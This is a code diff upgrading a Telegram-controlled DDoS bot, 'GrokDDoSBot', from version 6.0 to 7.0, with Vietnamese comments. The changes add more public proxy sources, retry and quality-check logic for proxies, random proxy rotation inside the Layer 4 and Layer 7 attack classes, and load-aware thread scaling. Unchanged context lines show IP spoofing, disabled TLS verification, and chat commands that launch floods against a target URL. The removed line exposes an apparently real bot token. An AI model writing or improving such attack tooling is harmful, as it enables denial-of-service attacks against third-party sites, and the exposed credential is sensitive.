@@ -38,7 +38,7 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
 # Hằng số
-__version__ = "GrokDDoSBot 6.0 - Siêu Proxy & Tối Ưu"
+__version__ = "GrokDDoSBot 7.0 - Siêu Proxy & Tối Ưu Nâng Cao"
 PROXY_LIST = set()
 ATTACK_HISTORY = []
 CONFIG_FILE = Path("config.json")
@@ -72,7 +72,7 @@ BYTES_SENT = Counter(0)
 # Cấu hình mặc định
 if not CONFIG_FILE.exists():
     with open(CONFIG_FILE, "w") as f:
-        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80, "PROXY_REFRESH_INTERVAL": 300}, f)
+        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80, "PROXY_REFRESH_INTERVAL": 300, "MAX_RETRIES": 3}, f)
 
 with open(CONFIG_FILE, "r") as f:
     config = json.load(f)
@@ -98,8 +98,8 @@ def humanformat(num: int, precision: int = 2) -> str:
         return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
     return str(num)
 
-# Quản lý proxy với nhiều nguồn hơn
-def fetch_proxies() -> Set[str]:
+# Quản lý proxy với nhiều nguồn hơn và kiểm tra kỹ lưỡng
+def fetch_proxies(retries: int = 0) -> Set[str]:
     global PROXY_LIST
     proxy_sources = [
         "https://www.freeproxylists.net/",
@@ -116,18 +116,30 @@ def fetch_proxies() -> Set[str]:
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
         "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://openproxy.space/list/http",
+        "https://openproxy.space/list/socks4",
+        "https://openproxy.space/list/socks5",
+        "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
     ]
     PROXY_LIST.clear()
     scraper = cloudscraper.create_scraper()
     
-    with ThreadPoolExecutor(max_workers=min(15, len(proxy_sources))) as executor:
-        futures = [executor.submit(scrape_proxy_source, url, scraper) for url in proxy_sources]
-        for future in as_completed(futures):
-            PROXY_LIST.update(future.result())
-    
-    # Lọc proxy chất lượng cao
+    try:
+        with ThreadPoolExecutor(max_workers=min(20, len(proxy_sources))) as executor:
+            futures = [executor.submit(scrape_proxy_source, url, scraper) for url in proxy_sources]
+            for future in as_completed(futures):
+                PROXY_LIST.update(future.result())
+    except Exception as e:
+        logger.error(f"Lỗi khi lấy proxy từ các nguồn: {e}")
+        if retries < config["MAX_RETRIES"]:
+            logger.info(f"Thử lại sau {retries + 1} giây...")
+            time.sleep(1)
+            return fetch_proxies(retries + 1)
+        return set()
+
+    # Lọc proxy chất lượng cao với kiểm tra chi tiết
     active_proxies = set()
-    with ThreadPoolExecutor(max_workers=100) as executor:
+    with ThreadPoolExecutor(max_workers=150) as executor:
         futures = {executor.submit(check_proxy_quality, proxy): proxy for proxy in PROXY_LIST}
         for future in as_completed(futures):
             proxy = futures[future]
@@ -135,16 +147,19 @@ def fetch_proxies() -> Set[str]:
                 active_proxies.add(proxy)
     
     PROXY_LIST = active_proxies
-    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy chất lượng cao từ {len(proxy_sources)} nguồn.")
+    if not PROXY_LIST:
+        logger.warning("Không tìm thấy proxy hoạt động nào. Vui lòng kiểm tra kết nối mạng hoặc nguồn proxy.")
+    else:
+        logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy chất lượng cao từ {len(proxy_sources)} nguồn.")
     return PROXY_LIST
 
 def scrape_proxy_source(url: str, scraper) -> Set[str]:
     proxies = set()
     try:
         response = scraper.get(url, timeout=config["PROXY_TIMEOUT"])
-        if "proxyscrape" in url or "proxy-list.download" in url:
+        if "proxyscrape" in url or "proxy-list.download" in url or "geonode" in url:
             proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
-        elif "TheSpeedX" in url or "clarketm" in url:
+        elif "TheSpeedX" in url or "clarketm" in url or "openproxy" in url:
             proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
         else:
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -159,19 +174,29 @@ def scrape_proxy_source(url: str, scraper) -> Set[str]:
         logger.error(f"Lỗi khi lấy proxy từ {url}: {e}")
     return proxies
 
-def check_proxy_quality(proxy: str) -> bool:
-    try:
-        ip, port = proxy.split(":")
-        start_time = time.time()
-        with socket.socket(AF_INET, SOCK_STREAM) as s:
-            s.settimeout(config["PROXY_TIMEOUT"])
-            s.connect((ip, int(port)))
-            s.send(b"HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n")
-            s.recv(1024)  # Kiểm tra phản hồi
-        latency = (time.time() - start_time) * 1000  # ms
-        return latency < 300  # Chỉ giữ proxy có độ trễ dưới 300ms
-    except:
-        return False
+def check_proxy_quality(proxy: str, max_retries: int = 2) -> bool:
+    retries = 0
+    while retries <= max_retries:
+        try:
+            ip, port = proxy.split(":")
+            start_time = time.time()
+            with socket.socket(AF_INET, SOCK_STREAM) as s:
+                s.settimeout(config["PROXY_TIMEOUT"])
+                s.connect((ip, int(port)))
+                s.send(b"HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+                response = s.recv(1024)
+                if response:
+                    latency = (time.time() - start_time) * 1000  # ms
+                    return latency < 300  # Chỉ giữ proxy có độ trễ dưới 300ms
+            return False
+        except Exception as e:
+            logger.debug(f"Proxy {proxy} không hoạt động (lần {retries + 1}): {e}")
+            retries += 1
+            if retries <= max_retries:
+                time.sleep(1)
+            else:
+                return False
+    return False
 
 # Tự động cập nhật proxy trong quá trình tấn công
 def auto_refresh_proxies():
@@ -184,7 +209,7 @@ def auto_refresh_proxies():
 def generate_packet(size: int = 1024, fragment: bool = False) -> bytes:
     data = random.randbytes(random.randint(size, size * 4))
     if fragment and len(data) > 1480:
-        return data[:1480]
+        return data[:1480]  # Phân mảnh thành gói nhỏ
     return data
 
 def generate_spoof_ip() -> str:
@@ -233,8 +258,11 @@ def validate_target(target: str, layer: str) -> Tuple[str, int] | None:
 # Điều chỉnh số luồng dựa trên tải hệ thống
 def adjust_threads(max_threads: int) -> int:
     cpu_usage = psutil.cpu_percent()
-    if cpu_usage > config["MAX_CPU_USAGE"]:
-        return max(max_threads // 2, 1)
+    mem_usage = psutil.virtual_memory().percent
+    if cpu_usage > config["MAX_CPU_USAGE"] or mem_usage > 90:
+        adjusted = max(max_threads // 2, 1)
+        logger.warning(f"Giới hạn luồng xuống {adjusted} do CPU {cpu_usage}% hoặc RAM {mem_usage}% quá tải.")
+        return adjusted
     return max_threads
 
 # Tấn công Layer 4 với thuật toán nâng cao
@@ -262,7 +290,7 @@ class Layer4Attack(threading.Thread):
         logger.info("Đã dừng tấn công.")
 
     def select_proxy(self) -> str | None:
-        if not self.proxies:
+        if not self.proxies or random.random() < 0.1:  # 10% cơ hội làm mới proxy
             self.proxies = fetch_proxies()
         return random.choice(list(self.proxies)) if self.proxies else None
 
@@ -405,7 +433,7 @@ class Layer7Attack(threading.Thread):
         self.save_history()
 
     def select_proxy(self) -> str | None:
-        if not self.proxies:
+        if not self.proxies or random.random() < 0.1:  # 10% cơ hội làm mới proxy
             self.proxies = fetch_proxies()
         return random.choice(list(self.proxies)) if self.proxies else None
 
@@ -664,9 +692,9 @@ async def l7(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration = int(duration)
         attack = Layer7Attack(url, method, duration, threads)
         attack.start()
-        await update.message.reply_text(f"Đã bắt đầu tấn công {method} vào {url}")
+        await update.message.reply_text(f"Đã bắt đầu tấn công {method} vào {url} với {threads} luồng trong {duration} giây")
     except Exception as e:
-        await update.message.reply_text(f"Lỗi: {str(e)}")
+        await update.message.reply_text(f"Lỗi: {str(e)}. Vui lòng kiểm tra cấu hình THREAD_LIMIT trong config.json hoặc tải CPU/RAM.")
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cpu_usage = psutil.cpu_percent()
@@ -684,7 +712,10 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def fetch_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fetch_proxies()
-    await update.message.reply_text(f"Đã cập nhật danh sách proxy với {len(PROXY_LIST)} proxy hoạt động.")
+    if not PROXY_LIST:
+        await update.message.reply_text("Đã cập nhật danh sách proxy nhưng không tìm thấy proxy hoạt động nào. Vui lòng kiểm tra kết nối mạng hoặc thêm nguồn proxy mới.")
+    else:
+        await update.message.reply_text(f"Đã cập nhật danh sách proxy với {len(PROXY_LIST)} proxy hoạt động.")
 
 async def methods(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -709,7 +740,7 @@ def main():
     # Khởi động luồng tự động làm mới proxy
     threading.Thread(target=auto_refresh_proxies, daemon=True).start()
     
-    application = Application.builder().token("7270463906:AAGO8qT3MSy0Wm3hZTWi4QNMXqOkkISgsC0").build()
+    application = Application.builder().token("YOUR_TELEGRAM_BOT_TOKEN").build()
     
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("l4", l4))
